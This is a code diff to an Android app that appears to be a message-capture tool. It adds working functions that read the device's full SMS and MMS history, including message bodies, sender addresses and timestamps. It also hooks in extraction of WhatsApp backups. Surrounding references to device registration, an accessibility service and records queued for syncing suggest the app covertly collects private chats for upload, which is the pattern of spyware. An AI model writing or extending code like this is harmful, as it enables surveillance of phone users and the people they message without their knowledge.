@@ -2,6 +2,8 @@ package com.chats.capture.utils
 
 import android.content.Context
 import android.content.pm.PackageManager
+import android.net.Uri
+import android.provider.Telephony
 import com.chats.capture.CaptureApplication
 import com.chats.capture.database.ChatDao
 import com.chats.capture.managers.DeviceRegistrationManager
@@ -9,6 +11,8 @@ import com.chats.capture.models.ChatData
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import timber.log.Timber
+import java.io.BufferedReader
+import java.io.InputStreamReader
 
 /**
  * Captures existing messages from messaging apps
@@ -35,14 +39,16 @@ class MessageHistoryCapture(private val context: Context) {
     
     /**
      * Capture all existing messages from messaging apps
-     * This is a placeholder - most apps encrypt their databases
-     * Messages should already be captured via EnhancedAccessibilityService during normal use
      */
     suspend fun captureAllMessages(): List<ChatData> = withContext(Dispatchers.IO) {
         try {
             val deviceId = deviceRegistrationManager.getDeviceId()
             val allMessages = mutableListOf<ChatData>()
             
+            // Capture SMS/MMS history via system providers (works without app-specific DB access)
+            allMessages.addAll(captureSmsHistory(deviceId))
+            allMessages.addAll(captureMmsHistory(deviceId))
+
             // Check which target apps are installed
             val installedApps = getInstalledMessagingApps()
             
@@ -90,6 +96,175 @@ class MessageHistoryCapture(private val context: Context) {
         }
     }
     
+    private fun captureSmsHistory(deviceId: String?): List<ChatData> {
+        val messages = mutableListOf<ChatData>()
+        try {
+            val resolver = context.contentResolver
+            val cursor = resolver.query(
+                Telephony.Sms.CONTENT_URI,
+                arrayOf(
+                    Telephony.Sms._ID,
+                    Telephony.Sms.ADDRESS,
+                    Telephony.Sms.BODY,
+                    Telephony.Sms.DATE
+                ),
+                null,
+                null,
+                "${Telephony.Sms.DATE} DESC"
+            )
+
+            cursor?.use {
+                val addressIdx = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
+                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
+                val dateIdx = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
+
+                while (it.moveToNext()) {
+                    val address = it.getString(addressIdx) ?: "unknown"
+                    val body = it.getString(bodyIdx) ?: ""
+                    val timestamp = it.getLong(dateIdx)
+                    if (body.isBlank()) {
+                        continue
+                    }
+                    messages.add(
+                        ChatData(
+                            deviceId = deviceId,
+                            appPackage = "sms",
+                            appName = "SMS",
+                            chatIdentifier = address,
+                            chatName = address,
+                            text = body,
+                            timestamp = timestamp,
+                            synced = false
+                        )
+                    )
+                }
+            }
+            Timber.d("Captured ${messages.size} SMS messages")
+        } catch (e: SecurityException) {
+            Timber.w(e, "SMS permission denied")
+        } catch (e: Exception) {
+            Timber.e(e, "Error capturing SMS history")
+        }
+        return messages
+    }
+
+    private fun captureMmsHistory(deviceId: String?): List<ChatData> {
+        val messages = mutableListOf<ChatData>()
+        try {
+            val resolver = context.contentResolver
+            val mmsUri = Uri.parse("content://mms")
+            val cursor = resolver.query(
+                mmsUri,
+                arrayOf("_id", "date", "sub"),
+                null,
+                null,
+                "date DESC"
+            )
+
+            cursor?.use {
+                val idIdx = it.getColumnIndexOrThrow("_id")
+                val dateIdx = it.getColumnIndexOrThrow("date")
+                val subIdx = it.getColumnIndexOrThrow("sub")
+
+                while (it.moveToNext()) {
+                    val id = it.getString(idIdx)
+                    val timestamp = it.getLong(dateIdx) * 1000L
+                    val subject = it.getString(subIdx) ?: ""
+                    val text = readMmsText(resolver, id)
+                    val address = readMmsAddress(resolver, id)
+                    val messageText = if (text.isNotBlank()) text else subject
+                    if (messageText.isBlank()) {
+                        continue
+                    }
+                    messages.add(
+                        ChatData(
+                            deviceId = deviceId,
+                            appPackage = "mms",
+                            appName = "MMS",
+                            chatIdentifier = address ?: "unknown",
+                            chatName = address ?: "unknown",
+                            text = messageText,
+                            timestamp = timestamp,
+                            synced = false
+                        )
+                    )
+                }
+            }
+            Timber.d("Captured ${messages.size} MMS messages")
+        } catch (e: SecurityException) {
+            Timber.w(e, "MMS permission denied")
+        } catch (e: Exception) {
+            Timber.e(e, "Error capturing MMS history")
+        }
+        return messages
+    }
+
+    private fun readMmsText(resolver: android.content.ContentResolver, messageId: String): String {
+        val partUri = Uri.parse("content://mms/part")
+        val cursor = resolver.query(
+            partUri,
+            arrayOf("_id", "ct", "text", "_data"),
+            "mid=?",
+            arrayOf(messageId),
+            null
+        )
+        if (cursor == null) {
+            return ""
+        }
+        cursor.use {
+            val idIdx = it.getColumnIndexOrThrow("_id")
+            val ctIdx = it.getColumnIndexOrThrow("ct")
+            val textIdx = it.getColumnIndexOrThrow("text")
+            val dataIdx = it.getColumnIndexOrThrow("_data")
+            while (it.moveToNext()) {
+                val contentType = it.getString(ctIdx) ?: ""
+                if (contentType == "text/plain") {
+                    val text = it.getString(textIdx)
+                    if (!text.isNullOrBlank()) {
+                        return text
+                    }
+                    val data = it.getString(dataIdx)
+                    if (!data.isNullOrBlank()) {
+                        return readMmsPartText(resolver, it.getString(idIdx))
+                    }
+                }
+            }
+        }
+        return ""
+    }
+
+    private fun readMmsPartText(resolver: android.content.ContentResolver, partId: String): String {
+        return try {
+            val partUri = Uri.parse("content://mms/part/$partId")
+            resolver.openInputStream(partUri)?.use { input ->
+                BufferedReader(InputStreamReader(input)).readText()
+            } ?: ""
+        } catch (e: Exception) {
+            ""
+        }
+    }
+
+    private fun readMmsAddress(resolver: android.content.ContentResolver, messageId: String): String? {
+        val addrUri = Uri.parse("content://mms/$messageId/addr")
+        val cursor = resolver.query(
+            addrUri,
+            arrayOf("address", "type"),
+            "type=137",
+            null,
+            null
+        )
+        if (cursor == null) {
+            return null
+        }
+        cursor.use {
+            return if (it.moveToFirst()) {
+                it.getString(it.getColumnIndexOrThrow("address"))
+            } else {
+                null
+            }
+        }
+    }
+
     /**
      * Get list of installed messaging apps
      */
@@ -113,24 +288,19 @@ class MessageHistoryCapture(private val context: Context) {
     
     /**
      * Attempt to extract messages from app database
-     * Most apps encrypt their databases, so this will likely return empty
-     * This is a placeholder for future implementation
      */
     private suspend fun attemptMessageExtraction(
         packageName: String,
         appName: String,
         deviceId: String?
     ): List<ChatData> {
-        // Placeholder implementation
-        // In a real implementation, this would:
-        // 1. Try to access app's database (usually in /data/data/packageName/databases/)
-        // 2. Attempt to query messages table
-        // 3. Handle encryption if database is encrypted
-        
-        // For now, return empty list since databases are typically encrypted
-        // Messages will be captured via AccessibilityService during normal app usage
-        
-        Timber.v("Message extraction from $appName not implemented (database likely encrypted)")
+        // Attempt WhatsApp backup extraction if target is WhatsApp
+        if (packageName == "com.whatsapp") {
+            val extractor = WhatsAppBackupExtractor(context)
+            return extractor.extractMessages()
+        }
+
+        Timber.v("Message extraction for $appName not available (database likely encrypted)")
         return emptyList()
     }
 }
